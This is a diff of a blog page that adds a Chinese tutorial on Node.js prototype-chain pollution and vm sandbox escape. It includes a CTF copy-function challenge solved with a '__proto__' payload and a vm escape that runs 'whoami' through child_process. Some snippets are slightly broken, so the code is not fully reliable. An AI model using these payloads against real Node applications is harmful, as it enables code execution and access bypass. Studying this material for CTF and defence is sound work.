@@ -11,7 +11,7 @@
   <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-  <title>wh1t3zer</title>
+  <title>NodeJS常见漏洞总结（下） | wh1t3zer</title>
 
   <link rel="icon" type="image/x-icon, image/vnd.microsoft.icon" href="/favicon.ico">
   <link rel="stylesheet" href="https://at.alicdn.com/t/font_1911880_c1nvbyezg17.css">
@@ -518,24 +518,33 @@
 
 
 <div class="post-detail-header" id="thumbnail_canvas" style="background-repeat: no-repeat; background-size: cover; 
-  background-position: center center;position: relative;background-image:url('/medias/1.jpg')">
+  background-position: center center;position: relative;background-image:url('/medias/5.jpg')">
   <div class="post-detail-header-mask"></div>
   <canvas id="header_canvas"style="position:absolute;bottom:0;pointer-events:none;"></canvas>
   
   <div class="post-detail-header_info-box">
     <div class="title-box">
       <span class="title">
-        
+        NodeJS常见漏洞总结（下）
       </span>
     </div>
     
     
       
         <span class="post-detail-header_date">
-          <i class="fas fa-calendar"></i> Published in：2023-01-31 |
+          <i class="fas fa-calendar"></i> Published in：2023-02-06 |
         </span>
       
 
+      
+        <span class="post-detail-header_categories">
+          <i class="iconfont iconbookmark1"></i> category：
+          
+            <a href="/categories/Node-js/" class="post-detail-header_category">
+              Node.js
+            </a>
+          
+        </span>
       
 
       
@@ -556,9 +565,71 @@
   <div class="main-content">
     <article class="post post-detail">
       <div class="post-content">
-        
+        <h2 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h2><p>上一章分析了NodeJS比较常见的漏洞类型，这章主要分析一下NodeJS原型链及原型链污染和NodeJS沙箱逃逸漏洞。当然还是先做个语言的简介（凑字数）</p>
+<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>Node.js发布于2009年5月，由Ryan Dahl开发，是一个基于<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/Chrome/5633839?fromModule=lemma_inlink">Chrome</a> <a target="_blank" rel="noopener" href="https://baike.baidu.com/item/V8/6178125?fromModule=lemma_inlink">V8</a>引擎的<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/JavaScript/321142?fromModule=lemma_inlink">JavaScript</a>运行环境，使用了一个<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E4%BA%8B%E4%BB%B6%E9%A9%B1%E5%8A%A8/9597519?fromModule=lemma_inlink">事件驱动</a>、非阻塞式I&#x2F;O模型， 让JavaScript 运行在<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E6%9C%8D%E5%8A%A1%E7%AB%AF/6492316?fromModule=lemma_inlink">服务端</a>的开发平台，它让JavaScript成为与<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/PHP/9337?fromModule=lemma_inlink">PHP</a>、<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/Python/407313?fromModule=lemma_inlink">Python</a>、<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/Perl/851577?fromModule=lemma_inlink">Perl</a>、<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/Ruby/11419?fromModule=lemma_inlink">Ruby</a>等服务端语言平起平坐的<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E8%84%9A%E6%9C%AC%E8%AF%AD%E8%A8%80/1379708?fromModule=lemma_inlink">脚本语言</a>。</p>
+<h2 id="0x01原型链"><a href="#0x01原型链" class="headerlink" title="0x01原型链"></a>0x01原型链</h2><p>学习原型链污染之前先了解一下原型链，原型链顾名思义就是一条“链子”</p>
+<p>它类似于JAVA中的继承关系但又不完全相同，没有父类子类的说法，而是绑在一条链上继承</p>
+<p>有2个关键词（prototype，proto）</p>
+<p><strong>prototype</strong></p>
+<p>函数的原型对象，一个函数指向一个对象</p>
+<p><strong>proto</strong></p>
+<p>实例化对象的原型对象，一个对象指向对象，该指向对象即为它的原型对象</p>
+<p>举例</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Food</span>(<span class="params">bar,bar1,bar2</span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">bar</span> = <span class="number">1</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">bar1</span>=<span class="number">5</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> food = <span class="keyword">new</span> <span class="title class_">Food</span>();</span><br><span class="line"><span class="title class_">Food</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">bar2</span>=<span class="number">6</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(food.<span class="property">bar1</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(food.<span class="property">bar2</span>);</span><br><span class="line"><span class="comment">//bar1是5</span></span><br><span class="line"><span class="comment">//bar2是6</span></span><br></pre></td></tr></table></figure>
+
+<p>定义了一个Food函数并传入bar，bar1和bar2参数，实例化对象，之后修改函数的prototype的值，此时food就有了与Food相同的属性</p>
+<p>总结</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Function</span>.<span class="property"><span class="keyword">prototype</span></span> == <span class="title class_">Object</span>.<span class="property">proto</span></span><br></pre></td></tr></table></figure>
+
+<p>关系图</p>
+<p><img src="https://raw.githubusercontent.com/wh1t3zer/recordCTF/main/imgs/dfd-%E7%AC%AC%2011%20%E9%A1%B5.drawio.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/wh1t3zer/recordCTF/main/imgs/dfd-%E7%AC%AC%2011%20%E9%A1%B5.drawio.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></p>
+<h2 id="0x02原型链污染"><a href="#0x02原型链污染" class="headerlink" title="0x02原型链污染"></a>0x02原型链污染</h2><p>原型链污染的原理就是通过修改实例化对象的属性间接修改原型对象的属性达到污染的目的</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">A</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">age</span>=<span class="number">15</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a = <span class="keyword">new</span> <span class="title function_">A</span>();</span><br><span class="line">A.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">age</span>=<span class="number">16</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a.<span class="property">age</span>);	<span class="comment">//15</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a.<span class="property">__proto__</span>.<span class="property">age</span> === A.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">age</span>)	<span class="comment">//true</span></span><br></pre></td></tr></table></figure>
+
+<p>定义了一个原型对象A，并实例化对象a，修改了原型对象A的age，而实例化对象的age却不会更改，即没有被访问</p>
+<h3 id="漏洞利用方法"><a href="#漏洞利用方法" class="headerlink" title="漏洞利用方法"></a>漏洞利用方法</h3><p>1、对象递归合并<br>2、按路径定义属性<br>3、对象克隆 </p>
+<h3 id="CTF原题"><a href="#CTF原题" class="headerlink" title="CTF原题"></a>CTF原题</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>).<span class="title function_">json</span>(),<span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> flag=<span class="string">&#x27;flag_here&#x27;</span>;</span><br><span class="line">  <span class="keyword">var</span> secert = &#123;&#125;;</span><br><span class="line">  <span class="keyword">var</span> sess = req.<span class="property">session</span>;</span><br><span class="line">  <span class="keyword">let</span> user = &#123;&#125;;</span><br><span class="line">  utils.<span class="title function_">copy</span>(user,req.<span class="property">body</span>);</span><br><span class="line">  <span class="keyword">if</span>(secert.<span class="property">ctfshow</span>===<span class="string">&#x27;36dboy&#x27;</span>)&#123;</span><br><span class="line">    res.<span class="title function_">end</span>(flag);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123;<span class="attr">ret_code</span>: <span class="number">2</span>, <span class="attr">ret_msg</span>: <span class="string">&#x27;登录失败&#x27;</span>+<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(user)&#125;);  </span><br><span class="line">  &#125; </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>题目的思路是当主键存在ctfshow，且ctfshow&#x3D;&#x3D;’36dboy’时，返回flag</p>
+<p>其中有一个关键函数是copy</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">copy</span>(<span class="params">object1, object2</span>)&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> object2) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> object2 &amp;&amp; key <span class="keyword">in</span> object1) &#123;</span><br><span class="line">            <span class="title function_">copy</span>(object1[key], object2[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            object1[key] = object2[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个函数是先判断object2和object1是否存在key，存在则调用copy函数，不存在则把object2的key赋值给object1</p>
+<p>可以把object2设置为</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;ctfshow&quot;</span>:<span class="string">&quot;36dboy&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>解题思路就是在路由函数里使用了一次copy函数，判断object2中存在主键是proto，返回true，然后又第二次调用了copy函数，此时主键为ctfshow，而对象则变成了object2.proto，进入到下一次判断ctfshow是否等于36dboy，明显object1里开始没有ctfshow，则执行了json()，并写到user内容里，下次判断则返回了true</p>
+<h3 id="常见漏洞类型"><a href="#常见漏洞类型" class="headerlink" title="常见漏洞类型"></a>常见漏洞类型</h3><h3 id="loadsh模块"><a href="#loadsh模块" class="headerlink" title="loadsh模块"></a><strong>loadsh模块</strong></h3><p><strong>Lodash 模块原型链污染</strong></p>
+<p><strong>lodash.defaultsDeep</strong></p>
+<p><strong>lodash.merge</strong></p>
+<p><strong>lodash.mergeWith</strong></p>
+<p><strong>lodash.setWith</strong></p>
+<p><strong>lodash.template</strong></p>
+<p><strong>merge方法</strong></p>
+<p>merge(targe,source){}</p>
+<p>作用是把source中的属性全部赋值到target中，如果属性名已经存在，target值不变，如果target中属性名不存在，那么新建属性，对应赋值</p>
+<h2 id="0x03NodeJS沙箱逃逸"><a href="#0x03NodeJS沙箱逃逸" class="headerlink" title="0x03NodeJS沙箱逃逸"></a>0x03NodeJS沙箱逃逸</h2><p>NodeJS里面有一个VM模块，其作用是提供一个虚拟的环境（类似于Windows的虚拟机），可以在里面随意操作而不影响真正程序的正常运行</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&quot;vm&quot;</span>)</span><br><span class="line"><span class="keyword">const</span> env = vm.<span class="title function_">runInNewContext</span>();	</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(env)</span><br></pre></td></tr></table></figure>
+
+<p>runInNewContext是创建全局环境，其中env就是sandbox对象</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&quot;vm&quot;</span>)</span><br><span class="line"><span class="keyword">const</span> env = vm.<span class="title function_">runInNewContext</span>(<span class="string">&quot;this.constructor.constructor&quot;</span>);</span><br><span class="line"><span class="comment">//this.constructor   ==&gt;&gt;    [Function:Object]</span></span><br><span class="line"><span class="comment">//this.constructor.constructor  ==&gt;&gt;   [Function:function] 递归创建对象</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(env)</span><br></pre></td></tr></table></figure>
+
+<p>其中this.constructor是创建一个函数对象，参考上面的关系图，此时可以调用模块执行命令</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&quot;vm&quot;</span>)</span><br><span class="line"><span class="keyword">const</span> env = vm.<span class="title function_">runInNewContext</span>(<span class="string">&quot;this.constructor.constructor&quot;</span>);</span><br><span class="line"><span class="comment">//this.constructor   ==&gt;&gt;    [Function:Object]</span></span><br><span class="line"><span class="comment">//this.constructor.constructor  ==&gt;&gt;   [Function:function] 递归创建对象</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(env)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> env = vm.<span class="title function_">runInNewContext</span>(<span class="string">`const process = this.constructor.constructor(&#x27;return this.process&#x27;)();process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;whoami&#x27;).toString()`</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//返回一个process对象，并调用对象的mainModule，类似运行虚拟机，在虚拟机里引用child_process模块，执行命令</span></span><br></pre></td></tr></table></figure>
+
+<p>注：该沙箱使用的全局环境来自于主系统内，也就是本机</p>
+<p><img src="https://raw.githubusercontent.com/wh1t3zer/recordCTF/main/imgs/image-20230216182552436.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/wh1t3zer/recordCTF/main/imgs/image-20230216182552436.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></p>
+
       </div>
       <div class="post-tags-categories">
+        
+        <div class="tags">
+          
+            <a href="/tags/Node-js/" class="">
+              Node.js
+            </a>
+          
+        </div>
         
       </div>
       
@@ -569,7 +640,7 @@
     </li>
     <li class="post-copyright-link">
     <strong>link:  </strong>
-    <a href="/2023/01/31/NodeJS原型链污染/" target="_blank" title="">https://wh1t3zer.github.io/2023/01/31/NodeJS原型链污染/</a>
+    <a href="/2023/02/06/NodeJS漏洞分析（下）/" target="_blank" title="NodeJS常见漏洞总结（下）">https://wh1t3zer.github.io/2023/02/06/NodeJS漏洞分析（下）/</a>
     </li>
     <li class="post-copyright-license">
       <strong>Copyright notice:   </strong>
@@ -587,21 +658,39 @@
 
 
 
+  
+  <div class="post-nav-prev post-nav-item">
+    <div class="post-nav-img" style="background-size: cover; 
+      background-position: center center;">
+      <img class="lazyload lazyload placeholder" src="/medias/1.jpg" class="lazyload placeholder" data-srcset="/medias/1.jpg" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="">
+    </div>
+    <a href="/2023/02/07/Docker%E5%91%BD%E4%BB%A4%E6%80%BB%E7%BB%93/" class="post-nav-link">
+      <div class="title">
+        <i class="fas fa-angle-left"></i> Prev:
+        <div class="title-text"></div>
+      </div>
+      
+      <!-- <div class="content">
+        
+      </div> -->
+    </a>
+  </div>
+
 
 
   
   <div class="post-nav-next post-nav-item">
     <div class="post-nav-img" style="background-size: cover; 
       background-position: center center;">
-      <img class="lazyload lazyload placeholder" src="/medias/4.jpg" class="lazyload placeholder" data-srcset="/medias/4.jpg" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" src="" alt="">
+      <img class="lazyload lazyload placeholder" src="/medias/6.jpg" class="lazyload placeholder" data-srcset="/medias/6.jpg" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" src="" alt="">
     </div>
-    <a href="/2023/01/31/%E6%B5%85%E8%B0%88RSA/" class="post-nav-link">
+    <a href="/2023/02/05/NodeJS%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%8A%EF%BC%89/" class="post-nav-link">
       <div class="title">
         Next: <i class="fas fa-angle-right"></i>
-        <div class="title-text">浅谈RSA加密</div>
+        <div class="title-text">NodeJS常见漏洞总结（上）</div>
       </div>
       <!-- <div class="content">
-        0x00前言最近我翻阅了许多CTF的题目，发现密码学都有至少一道题与RSA有关，那RSA到底是什么？RSA为什么会受欢迎
+        0x00前言目前Web安全经过日新月异的发展，许多新兴框架都替换掉了原来老旧的技术。而在CTF上，NodeJS安全的题目
       </div> -->
     </a>
   </div>
